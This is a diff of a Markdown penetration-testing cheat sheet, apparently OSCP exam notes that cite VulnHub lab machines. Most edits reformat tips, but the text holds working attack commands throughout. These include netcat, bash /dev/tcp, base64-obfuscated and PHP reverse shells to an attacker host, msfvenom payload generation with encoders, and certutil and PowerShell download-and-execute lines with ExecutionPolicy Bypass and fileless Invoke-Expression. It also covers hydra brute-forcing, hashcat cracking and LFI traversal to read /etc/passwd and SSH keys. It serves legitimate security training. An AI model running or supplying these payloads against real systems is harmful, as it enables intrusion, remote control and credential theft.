@@ -133,7 +133,9 @@ Download all files: `wget ftp://$TARGET/* --ftp-user=$USERNAME --ftp-password=$P
 
 ### 2.2. HTTP/HTTPS `80`/`443`/`8080`
 
-#### ☝️ Always check out pages in cURL or view page source for hidden elements
+> [!Tip]
+> 
+> Always check out pages in cURL or view page source for hidden elements
 
 |   |   |
 |---|---|
@@ -291,7 +293,9 @@ hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/bru
 
 #### MD5
 
-☝️ MD5 hashes are always **32 characters**
+> [!Tip]
+> 
+> MD5 hashes are always **32 characters**
 
 Examples: [DC-9](https://github.com/joetanx/oscp/blob/main/vulnhub/dc-9.md), [digitalworld.local:Development](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-development.md)
 
@@ -300,7 +304,9 @@ Examples: [DC-9](https://github.com/joetanx/oscp/blob/main/vulnhub/dc-9.md), [di
 |Hashcat|`hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt`|
 |Dictionary lookup online|<https://md5.gromweb.com/><br><https://crackstation.net/>|
 
-☝️ hashcat takes time and wordlists are limited, looking up MD5 hashes in online dictionaries typically yield better success rate
+> [!Tip]
+> 
+> hashcat takes time and wordlists are limited, looking up MD5 hashes in online dictionaries typically yield better success rate
 
 #### phpass
 
@@ -310,7 +316,9 @@ Examples: [DeRPnStiNK](https://github.com/joetanx/oscp/blob/main/vulnhub/derpnst
 |---|---|
 |Hashcat|`hashcat -m 400 hashes.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt`|
 
-☝️ `rockyou.txt` has **14 million** entries that takes hashcat about an hour to crunch through, the SecLists top **1 million** list will be a good alternative that takes hashcat about 2 minutues to crunch through and yet still provide sufficient password coverage
+> [!Tip]
+> 
+> `rockyou.txt` has **14 million** entries that takes hashcat about an hour to crunch through, the SecLists top **1 million** list will be a good alternative that takes hashcat about 2 minutues to crunch through and yet still provide sufficient password coverage
 
 ### 2.8. Wordpress
 
@@ -384,7 +392,9 @@ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u
 
 DVWA LFI/RFI: <https://medium.com/@manjuteju008/understanding-file-inclusion-attack-using-dvwa-web-application-30d06846c269>
 
-☝️ if a LFI exists, try to append `../` until you can read the `/etc/passwd` file
+> [!Tip]
+> 
+> if a LFI exists, try to append `../` until you can read the `/etc/passwd` file
 
 cURL and browsers collapses `../` automatically, escape the `/` with `\` to ensure traversal
 
@@ -393,7 +403,9 @@ cURL and browsers collapses `../` automatically, escape the `/` with `\` to ensu
 |LFI Examples|[digitalworld.local:MERCYv2](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-mercy.md), [digitalworld.local:FALL](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-fall.md)|
 |RFI Examples|[digitalworld.local:Bravery](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-bravery.md)|
 
-☝️ if users with console login are found in `/etc/passwd`, try searching their home directories for ssh keys (e.g. `$HOME/.ssh/id_rsa`)
+> [!Tip]
+> 
+> if users with console login are found in `/etc/passwd`, try searching their home directories for ssh keys (e.g. `$HOME/.ssh/id_rsa`)
 
 ### 3.3. SQL injection
 
@@ -488,10 +500,13 @@ rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f
 ```sh
 bash -i >& /dev/tcp/$KALI/4444 0>&1
 ```
-☝️ **base64 encode/decode** can be useful to bypass restricted interfaces that filter out characters like `/` (examples: [djinn:1](https://github.com/joetanx/oscp/blob/main/vulnhub/djinn-1.md), [bob](https://github.com/joetanx/oscp/blob/main/vulnhub/bob.md))
 
-1. **base64 encode** on Kali: `echo 'bash -i >& /dev/tcp/192.168.17.10/4444 0>&1' | base64` to get `YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEwLzQ0NDQgMD4mMQo=`
-2. **base64 decode** and run on target: `echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEwLzQ0NDQgMD4mMQo=' | base64 -d | bash`
+> [!Tip]
+> 
+> **base64 encode/decode** can be useful to bypass restricted interfaces that filter out characters like `/` (examples: [djinn:1](https://github.com/joetanx/oscp/blob/main/vulnhub/djinn-1.md), [bob](https://github.com/joetanx/oscp/blob/main/vulnhub/bob.md))
+> 
+> 1. **base64 encode** on Kali: `echo 'bash -i >& /dev/tcp/192.168.17.10/4444 0>&1' | base64` to get `YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEwLzQ0NDQgMD4mMQo=`
+> 2. **base64 decode** and run on target: `echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEwLzQ0NDQgMD4mMQo=' | base64 -d | bash`
 
 #### Python
 
@@ -512,9 +527,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 |Using `passthru` to call a `bash` reverse shell|`<?php passthru("/bin/bash -c 'bash -i >/dev/tcp/$KALI/4444 0>&1'"); ?>`|
 |In some cases above doesn't work (e.g. [gh0st](https://github.com/joetanx/oscp/blob/main/pwk-lab/gh0st.md)), copy from this and change the IP/port|`/usr/share/webshells/php/php-reverse-shell.php`|
 
-☝️ To use PHP reverse shell on RFI, save the file on Kali as `.txt`, not `.php`; otherwise, it will be Kali that is connecting to itself
-
-☝️ Sometimes `exec` or `system` may not work, try other methods (`passthru`) of php execution (as seen in [PAIN](https://github.com/joetanx/oscp/blob/main/pwk-lab/pain.md))
+> [!Tip]
+> 
+> To use PHP reverse shell on RFI, save the file on Kali as `.txt`, not `.php`; otherwise, it will be Kali that is connecting to itself
+> 
+> Sometimes `exec` or `system` may not work, try other methods (`passthru`) of php execution (as seen in [PAIN](https://github.com/joetanx/oscp/blob/main/pwk-lab/pain.md))
 
 Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-bravery.md), [SAR](https://github.com/joetanx/oscp/blob/main/vulnhub/sar.md), [PAIN](https://github.com/joetanx/oscp/blob/main/pwk-lab/pain.md)
 
@@ -545,9 +562,11 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 |PHP|`msfvenom -p php/reverse_php LHOST=$KALI LPORT=4444 -f raw -o reverse.php`|
 |Node.js|`msfvenom -p nodejs/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f js_le -o reverse.js`|
 
-☝️ Use `linux/x86/shell_reverse_tcp` or `windows/shell_reverse_tcp` to generate a x86 payload
-
-☝️ Add `-e x86/shikata_ga_nai -i 9` to use encoder (`-i 9` means 9 iterations, uses 1 iteration if `-i` is omitted)
+> [!Tip]
+> 
+> Use `linux/x86/shell_reverse_tcp` or `windows/shell_reverse_tcp` to generate a x86 payload
+>
+> Add `-e x86/shikata_ga_nai -i 9` to use encoder (`-i 9` means 9 iterations, uses 1 iteration if `-i` is omitted)
 
 #### PowerShell-based reverse shell script:
 
@@ -571,17 +590,22 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 |   |   |
 |---|---|
 |certutil|`certutil.exe /urlcache /f /split http://$KALI/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe`|
-|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://$KALI/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|
+|PowerShell<br>(System.Net.WebClient)|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://$KALI/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|
+|PowerShell<br>(Invoke-WebRequest)|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://$KALI/reverse.exe -OutFile .\reverse.exe; Start-Process %TEMP%\reverse.exe`|
 
 #### Windows: Execute PowerShell-based reverse shell script
 
-☝️ `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only
-
-(i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)
-
-```cmd
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/reverse.ps1')
-```
+> [!Tip]
+>
+> `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only
+>
+> (i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)
+>
+> ```cmd
+> powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/reverse.ps1')
+> 
+> powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Invoke-WebRequest -Uri http://$KALI/reverse.ps1')
+> ```
 
 #### Linux: Execute reverse shell TCP payload
 
